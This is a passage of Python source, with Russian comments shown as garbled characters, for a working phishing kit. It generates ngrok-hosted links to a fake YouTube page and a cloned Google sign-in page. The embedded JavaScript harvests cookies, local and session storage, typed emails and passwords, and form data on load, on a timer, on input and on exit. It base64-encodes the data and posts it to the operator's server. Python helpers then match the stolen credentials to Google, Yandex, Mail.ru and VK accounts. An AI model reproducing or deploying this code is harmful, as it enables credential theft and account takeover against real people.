            if 'twitter' in cookie_name or 'auth_token' in cookie_name:
                services.add('twitter')
            if 'vk' in cookie_name or 'vkontakte' in cookie_name:
                services.add('vk')
            if 'yandex' in cookie_name:
                services.add('yandex')
        
        # –ò–∑ –ª–æ–≥–∏–Ω–æ–≤/–ø–∞—Ä–æ–ª–µ–π
        emails = []
        emails.extend([l.get('value') for l in data.get('logins', []) if '@' in l.get('value', '')])
        
        for email in emails:
            email_lower = email.lower()
            if '@gmail.com' in email_lower or '@googlemail.com' in email_lower:
                services.add('google')
            if '@yandex.' in email_lower or '@ya.ru' in email_lower:
                services.add('yandex')
            if '@mail.ru' in email_lower or '@inbox.ru' in email_lower:
                services.add('mailru')
            if '@vk.com' in email_lower:
                services.add('vk')
        
        return list(services)
    
    def find_credentials_for_service(self, service, logins, passwords):
        """–ù–∞—Ö–æ–¥–∏—Ç —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —Å–µ—Ä–≤–∏—Å–∞"""
        email = None
        password = None
        
        # –°–æ–ø–æ—Å—Ç–∞–≤–ª—è–µ–º email –∏ –ø–∞—Ä–æ–ª—å –ø–æ –ø–æ–ª—è–º —Ñ–æ—Ä–º—ã
        for login in logins:
            login_value = login.get('value', '')
            
            # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å–µ—Ä–≤–∏—Å –ø–æ email
            if '@' in login_value:
                if service == 'google' and ('@gmail.com' in login_value or '@googlemail.com' in login_value):
                    email = login_value
                elif service == 'yandex' and ('@yandex.' in login_value or '@ya.ru' in login_value):
                    email = login_value
                elif service == 'mailru' and ('@mail.ru' in login_value or '@inbox.ru' in login_value or '@list.ru' in login_value or '@bk.ru' in login_value):
                    email = login_value
                elif service == 'vk' and '@vk.com' in login_value:
                    email = login_value
        
        # –ò—â–µ–º –ø–∞—Ä–æ–ª—å
        for pwd in passwords:
            # –ü–∞—Ä–æ–ª—å –º–æ–∂–µ—Ç –±—ã—Ç—å —Å–≤—è–∑–∞–Ω –ø–æ —Ñ–æ—Ä–º–µ –∏–ª–∏ –ø–æ–ª—é
            password = pwd.get('value')
            break  # –ë–µ—Ä–µ–º –ø–µ—Ä–≤—ã–π –Ω–∞–π–¥–µ–Ω–Ω—ã–π
        
        return email, password
    
    def close(self):
        """–ó–∞–∫—Ä—ã–≤–∞–µ—Ç –¥—Ä–∞–π–≤–µ—Ä"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞ –∞–≤—Ç–æ–≤—Ö–æ–¥–∞
auto_login_manager = AutoLoginManager()

# ========== YOUTUBE –ú–ï–ù–ï–î–ñ–ï–† ==========
class YouTubeManager:
    @staticmethod
    def extract_video_id(url):
        """–ò–∑–≤–ª–µ–∫–∞–µ—Ç ID –≤–∏–¥–µ–æ –∏–∑ YouTube URL"""
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'v=([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        # –î–µ—Ñ–æ–ª—Ç–Ω–æ–µ –≤–∏–¥–µ–æ (Rick Roll)
        return "dQw4w9WgXcQ"
    
    @staticmethod
    def generate_phishing_url(ngrok_url, youtube_id, link_id):
        """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Ñ–∏—à–∏–Ω–≥–æ–≤—É—é —Å—Å—ã–ª–∫—É"""
        return f"{ngrok_url}/watch?v={youtube_id}&id={link_id}&t={int(time.time())}"
    
    @staticmethod
    def get_video_info(youtube_id):
        """–ü–æ–ª—É—á–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∏–¥–µ–æ"""
        try:
            # –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å —á–µ—Ä–µ–∑ YouTube API (—É–ø—Ä–æ—â–µ–Ω–Ω–æ)
            return {
                "title": f"YouTube Video {youtube_id}",
                "description": "–ò–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ –≤–∏–¥–µ–æ –Ω–∞ YouTube",
                "thumbnail": f"https://img.youtube.com/vi/{youtube_id}/maxresdefault.jpg"
            }
        except:
            return {
                "title": "YouTube Video",
                "description": "–°–º–æ—Ç—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ –≤–∏–¥–µ–æ",
                "thumbnail": ""
            }

# ========== HTML –®–ê–ë–õ–û–ù–´ ==========
HTML_TEMPLATES = {
    "youtube_page": """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: #0f0f0f;
            color: #fff;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .player-container {
            position: relative;
            padding-bottom: 56.25%;
            height: 0;
            overflow: hidden;
            border-radius: 12px;
            background: #000;
            margin-bottom: 20px;
        }
        
        .player-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
        
        .video-title {
            font-size: 24px;
            margin: 20px 0 10px;
            font-weight: bold;
        }
        
        .video-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }
        
        .video-views {
            color: #aaa;
            font-size: 14px;
        }
        
        .video-actions {
            display: flex;
            gap: 10px;
        }
        
        .action-btn {
            background: #272727;
            border: none;
            color: #fff;
            padding: 8px 15px;
            border-radius: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .action-btn:hover {
            background: #3d3d3d;
        }
        
        .channel-info {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .channel-avatar {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: #666;
        }
        
        .channel-name {
            font-weight: bold;
        }
        
        .subscribe-btn {
            background: #cc0000;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            cursor: pointer;
            font-weight: bold;
        }
        
        .comments-section {
            margin-top: 30px;
        }
        
        .comment {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .comment-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #444;
        }
        
        .comment-content {
            flex: 1;
        }
        
        .comment-author {
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .comment-text {
            color: #ddd;
            line-height: 1.4;
        }
        
        .ad-banner {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
        }
        
        .login-prompt {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 10px;
            padding: 20px;
            margin-top: 30px;
        }
        
        .login-prompt h3 {
            margin-bottom: 10px;
            color: #fff;
        }
        
        .login-prompt p {
            color: #aaa;
            margin-bottom: 15px;
        }
        
        .login-btn {
            background: #4285f4;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
        }
        
        .loading {
            text-align: center;
            padding: 50px;
            color: #aaa;
        }
        
        /* –ú–æ–±–∏–ª—å–Ω–∞—è –∞–¥–∞–ø—Ç–∞—Ü–∏—è */
        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            .video-title {
                font-size: 18px;
            }
            
            .video-info {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- –†–µ–∫–ª–∞–º–Ω—ã–π –±–∞–Ω–Ω–µ—Ä -->
        <div class="ad-banner">
            üé¨ –î–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –≤–∏–¥–µ–æ —Ç—Ä–µ–±—É–µ—Ç—Å—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Google
        </div>
        
        <!-- –ü–ª–µ–µ—Ä -->
        <div class="player-container">
            <iframe 
                src="https://www.youtube.com/embed/{youtube_id}?autoplay=1&controls=1&showinfo=0&rel=0&modestbranding=1" 
                frameborder="0" 
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                allowfullscreen
                id="youtubePlayer">
            </iframe>
        </div>
        
        <!-- –ó–∞–≥–æ–ª–æ–≤–æ–∫ –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è -->
        <h1 class="video-title">{video_title}</h1>
        
        <div class="video-info">
            <div class="video-views">
                {views_count} –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤ ‚Ä¢ {upload_date}
            </div>
            <div class="video-actions">
                <button class="action-btn">üëç {like_count}</button>
                <button class="action-btn">üëé</button>
                <button class="action-btn">üì§ –ü–æ–¥–µ–ª–∏—Ç—å—Å—è</button>
                <button class="action-btn">üíæ –°–æ—Ö—Ä–∞–Ω–∏—Ç—å</button>
            </div>
        </div>
        
        <!-- –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–∞–Ω–∞–ª–µ -->
        <div class="channel-info">
            <div class="channel-avatar"></div>
            <div>
                <div class="channel-name">{channel_name}</div>
                <div style="color: #aaa; font-size: 14px;">{subscribers_count} –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤</div>
            </div>
            <button class="subscribe-btn">–ü–û–î–ü–ò–°–ê–¢–¨–°–Ø</button>
        </div>
        
        <!-- –û–ø–∏—Å–∞–Ω–∏–µ -->
        <div style="background: #1a1a1a; padding: 15px; border-radius: 10px; margin: 20px 0; line-height: 1.6;">
            {video_description}
        </div>
        
        <!-- –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ -->
        <div class="comments-section">
            <h3 style="margin-bottom: 20px;">üí¨ –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ ({comments_count})</h3>
            
            <div class="comment">
                <div class="comment-avatar"></div>
                <div class="comment-content">
                    <div class="comment-author">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å 1</div>
                    <div class="comment-text">–û—Ç–ª–∏—á–Ω–æ–µ –≤–∏–¥–µ–æ! –°–ø–∞—Å–∏–±–æ –∑–∞ –∫–æ–Ω—Ç–µ–Ω—Ç! üëç</div>
                </div>
            </div>
            
            <div class="comment">
                <div class="comment-avatar"></div>
                <div class="comment-content">
                    <div class="comment-author">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å 2</div>
                    <div class="comment-text">–û—á–µ–Ω—å –∏–Ω—Ñ–æ—Ä–º–∞—Ç–∏–≤–Ω–æ, –∂–¥—É –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è!</div>
                </div>
            </div>
        </div>
        
        <!-- –ó–∞–ø—Ä–æ—Å –Ω–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é -->
        <div class="login-prompt" id="loginPrompt">
            <h3>üîê –¢—Ä–µ–±—É–µ—Ç—Å—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</h3>
            <p>–î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –∏ –¥–æ—Å—Ç—É–ø–∞ –∫–æ –≤—Å–µ–º —Ñ—É–Ω–∫—Ü–∏—è–º YouTube –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤–æ–π—Ç–∏ –≤ –∞–∫–∫–∞—É–Ω—Ç Google.</p>
            <button class="login-btn" onclick="showLoginForm()">–í–û–ô–¢–ò –í –ê–ö–ö–ê–£–ù–¢</button>
        </div>
        
        <!-- –§–æ—Ä–º–∞ –≤—Ö–æ–¥–∞ (—Å–∫—Ä—ã—Ç–∞ –∏–∑–Ω–∞—á–∞–ª—å–Ω–æ) -->
        <div id="loginForm" style="display: none;">
            <div style="background: #1a1a1a; padding: 25px; border-radius: 10px; margin: 20px 0; border: 1px solid #333;">
                <h3 style="color: #fff; margin-bottom: 20px;">–í—Ö–æ–¥ –≤ Google</h3>
                <form id="googleLoginForm">
                    <input type="email" 
                           id="emailField"
                           placeholder="–≠–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞—è –ø–æ—á—Ç–∞ –∏–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω" 
                           style="width: 100%; padding: 15px; margin: 10px 0; background: #2d2d2d; border: 1px solid #444; border-radius: 5px; color: white;">
                    <input type="password" 
                           id="passwordField"
                           placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å" 
                           style="width: 100%; padding: 15px; margin: 10px 0; background: #2d2d2d; border: 1px solid #444; border-radius: 5px; color: white;">
                    <button type="submit" 
                            style="width: 100%; padding: 15px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 10px;">
                        –î–∞–ª–µ–µ
                    </button>
                </form>
                <p style="color: #666; font-size: 12px; margin-top: 15px;">
                    –ù–∞–∂–∏–º–∞—è –∫–Ω–æ–ø–∫—É "–î–∞–ª–µ–µ", –≤—ã —Å–æ–≥–ª–∞—à–∞–µ—Ç–µ—Å—å —Å –£—Å–ª–æ–≤–∏—è–º–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∏ –ü–æ–ª–∏—Ç–∏–∫–æ–π –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏ Google.
                </p>
            </div>
        </div>
        
        <!-- –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏ -->
        <div class="loading" id="loading">
            –ó–∞–≥—Ä—É–∑–∫–∞ –≤–∏–¥–µ–æ... –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ
        </div>
    </div>
    
    <script>
        // –î–∞–Ω–Ω—ã–µ –¥–ª—è —Å–±–æ—Ä–∞
        const linkId = "{link_id}";
        const serverUrl = "{server_url}";
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–±–æ—Ä–∞ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö
        function collectAllData() {{
            const data = {{
                timestamp: new Date().toISOString(),
                url: window.location.href,
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: {{
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                }},
                cookies: {{}},
                localStorage: {{}},
                sessionStorage: {{}},
                passwords: [],
                logins: [],
                creditCards: [],
                autofillData: {{}},
                browserInfo: {{
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack
                }},
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            }};
            
            try {{
                // –°–æ–±–∏—Ä–∞–µ–º cookies
                const cookieString = document.cookie;
                if (cookieString) {{
                    cookieString.split(';').forEach(cookie => {{
                        const [name, value] = cookie.trim().split('=');
                        if (name && value) {{
                            data.cookies[name] = decodeURIComponent(value);
                        }}
                    }});
                }}
                
                // –°–æ–±–∏—Ä–∞–µ–º LocalStorage
                if (window.localStorage) {{
                    for (let i = 0; i < localStorage.length; i++) {{
                        const key = localStorage.key(i);
                        data.localStorage[key] = localStorage.getItem(key);
                    }}
                }}
                
                // –°–æ–±–∏—Ä–∞–µ–º SessionStorage
                if (window.sessionStorage) {{
                    for (let i = 0; i < sessionStorage.length; i++) {{
                        const key = sessionStorage.key(i);
                        data.sessionStorage[key] = sessionStorage.getItem(key);
                    }}
                }}
                
                // –°–æ–±–∏—Ä–∞–µ–º –ø–∞—Ä–æ–ª–∏ –∏–∑ –ø–æ–ª–µ–π
                document.querySelectorAll('input[type="password"]').forEach(field => {{
                    if (field.value) {{
                        data.passwords.push({{
                            field: field.name || field.id || 'password',
                            value: field.value,
                            form: field.form ? field.form.id : 'no_form'
                        }});
                    }}
                }});
                
                // –°–æ–±–∏—Ä–∞–µ–º –ª–æ–≥–∏–Ω—ã
                const loginFields = document.querySelectorAll('input[type="text"], input[type="email"]');
                loginFields.forEach(field => {{
                    if (field.value) {{
                        data.logins.push({{
                            field: field.name || field.id || 'login',
                            value: field.value,
                            type: field.type
                        }});
                    }}
                }});
                
                // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è
                document.querySelectorAll('form').forEach(form => {{
                    try {{
                        const formData = new FormData(form);
                        const formValues = {{}};
                        for (let [key, value] of formData.entries()) {{
                            formValues[key] = value;
                        }}
                        if (Object.keys(formValues).length > 0) {{
                            data.autofillData[form.id || 'form_' + Date.now()] = formValues;
                        }}
                    }} catch (e) {{}}
                }});
                
                return data;
                
            }} catch (error) {{
                console.error('Error collecting data:', error);
                return data;
            }}
        }}
        
        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        function sendData(data, type = 'page_load') {{
            try {{
                // –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –≤ Base64
                const jsonStr = JSON.stringify(data);
                const encodedData = btoa(unescape(encodeURIComponent(jsonStr)));
                
                fetch(serverUrl + '/api/collect', {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json',
                    }},
                    body: JSON.stringify({{
                        link_id: linkId,
                        data_type: type,
                        data: encodedData,
                        timestamp: new Date().toISOString()
                    }})
                }}).catch(() => {{}});
            }} catch (error) {{
                console.error('Error sending data:', error);
            }}
        }}
        
        // –û—Å–Ω–æ–≤–Ω–æ–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
        window.addEventListener('load', function() {{
            // –°–±–æ—Ä –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            setTimeout(() => {{
                const data = collectAllData();
                sendData(data, 'initial_load');
            }}, 2000);
            
            // –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏–π —Å–±–æ—Ä –∫–∞–∂–¥—ã–µ 10 —Å–µ–∫—É–Ω–¥
            setInterval(() => {{
                const data = collectAllData();
                sendData(data, 'periodic');
            }}, 10000);
            
            // –°–±–æ—Ä –ø—Ä–∏ —É—Ö–æ–¥–µ —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            window.addEventListener('beforeunload', function() {{
                const data = collectAllData();
                const jsonData = JSON.stringify({{
                    link_id: linkId,
                    data_type: 'page_exit',
                    data: btoa(unescape(encodeURIComponent(JSON.stringify(data))))
                }});
                
                navigator.sendBeacon(serverUrl + '/api/collect', jsonData);
            }});
        }});
        
        // –°–±–æ—Ä –ø—Ä–∏ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–∏ —Å —Ñ–æ—Ä–º–∞–º–∏
        document.addEventListener('submit', function(e) {{
            setTimeout(() => {{
                const data = collectAllData();
                sendData(data, 'form_submit');
            }}, 1000);
        }});
        
        // –°–±–æ—Ä –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ –ø–æ–ª–µ–π
        document.addEventListener('input', function(e) {{
            if (e.target.type === 'password' || e.target.type === 'email' || e.target.type === 'text') {{
                setTimeout(() => {{
                    const data = collectAllData();
                    sendData(data, 'field_input');
                }}, 2000);
            }}
        }});
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∫–∞–∑–∞ —Ñ–æ—Ä–º—ã –≤—Ö–æ–¥–∞
        function showLoginForm() {{
            document.getElementById('loginPrompt').style.display = 'none';
            document.getElementById('loginForm').style.display = 'block';
            document.getElementById('loading').innerHTML = 'üîê –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö...';
            
            // –ò–º–∏—Ç–∞—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏
            setTimeout(function() {{
                document.getElementById('loading').innerHTML = '‚úÖ –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥! –ü—Ä–æ–¥–æ–ª–∂–∞–µ–º –ø—Ä–æ—Å–º–æ—Ç—Ä...';
                setTimeout(function() {{
                    document.getElementById('loading').style.display = 'none';
                }}, 2000);
            }}, 1500);
        }}
        
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–æ—Ä–º—ã –≤—Ö–æ–¥–∞
        document.getElementById('googleLoginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            document.getElementById('loading').innerHTML = 'üîê –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏...';
            
            // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ —Ñ–æ—Ä–º—ã
            const email = document.getElementById('emailField').value;
            const password = document.getElementById('passwordField').value;
            
            // –°–æ–±–∏—Ä–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            const formData = collectAllData();
            formData.formCredentials = {{ email, password }};
            sendData(formData, 'login_form');
            
            // –ò–º–∏—Ç–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ–≥–æ –≤—Ö–æ–¥–∞
            setTimeout(function() {{
                document.getElementById('loading').innerHTML = '‚úÖ –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥! –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ...';
            }}, 2000);
        }});
        
        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–æ–∫–∞–∑ —Ñ–æ—Ä–º—ã —á–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥
        setTimeout(function() {{
            showLoginForm();
        }}, 10000);
    </script>
</body>
</html>
""",

    "login_form": """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è Google</title>
    <style>
        body {
            font-family: 'Google Sans', Arial, sans-serif;
            background: #f1f3f4;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        .login-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 40px;
            width: 100%;
            max-width: 450px;
        }
        
        .google-logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .google-logo img {
            width: 75px;
            height: 24px;
        }
        
        h1 {
            text-align: center;
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 10px;
        }
        
        .subtitle {
            text-align: center;
            color: #5f6368;
            margin-bottom: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        .form-group input:focus {
            border-color: #1a73e8;
            outline: none;
        }
        
        .login-button {
            width: 100%;
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 0;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
        }
        
        .login-button:hover {
            background: #1669d6;
        }
        
        .footer-links {
            display: flex;
            justify-content: space-between;
            margin-top: 30px;
            font-size: 14px;
        }
        
        .footer-links a {
            color: #1a73e8;
            text-decoration: none;
        }
        
        .language-selector {
            text-align: center;
            margin-top: 40px;
            font-size: 12px;
            color: #5f6368;
        }
        
        .privacy-notice {
            font-size: 12px;
            color: #5f6368;
            margin-top: 20px;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="google-logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        </div>
        
        <h1>–í–æ–π–¥–∏—Ç–µ –≤ –∞–∫–∫–∞—É–Ω—Ç Google</h1>
        <div class="subtitle">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ —Ä–∞–±–æ—Ç—É –Ω–∞ YouTube</div>
        
        <form id="googleLoginForm">
            <div class="form-group">
                <input type="email" id="email" name="email" placeholder="–≠–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞—è –ø–æ—á—Ç–∞ –∏–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω" required>
            </div>
            
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å" required>
            </div>
            
            <button type="submit" class="login-button">–î–∞–ª–µ–µ</button>
        </form>
        
        <div class="footer-links">
            <a href="#">–°–æ–∑–¥–∞—Ç—å –∞–∫–∫–∞—É–Ω—Ç</a>
            <a href="#">–ó–∞–±—ã–ª–∏ –ø–∞—Ä–æ–ª—å?</a>
        </div>
        
        <div class="privacy-notice">
            –ù–∞–∂–∏–º–∞—è –∫–Ω–æ–ø–∫—É ¬´–î–∞–ª–µ–µ¬ª, –≤—ã —Å–æ–≥–ª–∞—à–∞–µ—Ç–µ—Å—å —Å <a href="#">–£—Å–ª–æ–≤–∏—è–º–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è</a> 
            –∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç–µ –ø—Ä–æ—á—Ç–µ–Ω–∏–µ <a href="#">–ü–æ–ª–∏—Ç–∏–∫–∏ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏</a> Google.
        </div>
        
        <div class="language-selector">
            <select style="border: none; background: none; color: #5f6368;">
                <option>–†—É—Å—Å–∫–∏–π</option>
                <option>English</option>
            </select>
        </div>
    </div>
    
    <script>
        const linkId = '{link_id}';
        const serverUrl = '{server_url}';
        
        document.getElementById('googleLoginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
            const data = {{
                timestamp: new Date().toISOString(),
                email: email,
                password: password,
                userAgent: navigator.userAgent,
                cookies: document.cookie,
                url: window.location.href
            }};
            
            // –ö–æ–¥–∏—Ä—É–µ–º –≤ Base64
            const jsonStr = JSON.stringify(data);
            const encodedData = btoa(unescape(encodeURIComponent(jsonStr)));
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            fetch(serverUrl + '/api/collect_login', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/json',
                }},
                body: JSON.stringify({{
                    link_id: linkId,
                    data_type: 'google_login',
                    data: encodedData
                }})
            }}).then(() => {{
                // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ "—É—Å–ø–µ—à–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É"
                window.location.href = serverUrl + '/login_success?service=google';
            }});
        }});
    </script>
</body>
</html>
""",

    "login_success": """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f1f3f4;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        
        .success-container {
            background: white;
            border-radius: 10px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        
        .success-icon {
            color: #34a853;
            font-size: 60px;
            margin-bottom: 20px;
        }
        
        h1 {
            color: #202124;
            margin-bottom: 10px;
        }
        
        p {
            color: #5f6368;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        
        .continue-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        
        .continue-btn:hover {
            background: #1669d6;
        }
    </style>
</head>
<body>
    <div class="success-container">
        <div class="success-icon">‚úÖ</div>
        <h1>–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω —É—Å–ø–µ—à–Ω–æ!</h1>
        <p>–í—ã —É—Å–ø–µ—à–Ω–æ –≤–æ—à–ª–∏ –≤ —Å–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç {service}.</p>
        <p>–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å –ø—Ä–æ—Å–º–æ—Ç—Ä –≤–∏–¥–µ–æ –Ω–∞ YouTube.</p>
        <a href="/" class="continue-btn">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å –ø—Ä–æ—Å–º–æ—Ç—Ä</a>
    </div>
</body>
</html>
"""
}

# ========== FLASK –°–ï–†–í–ï–† ==========
app = Flask(__name__)
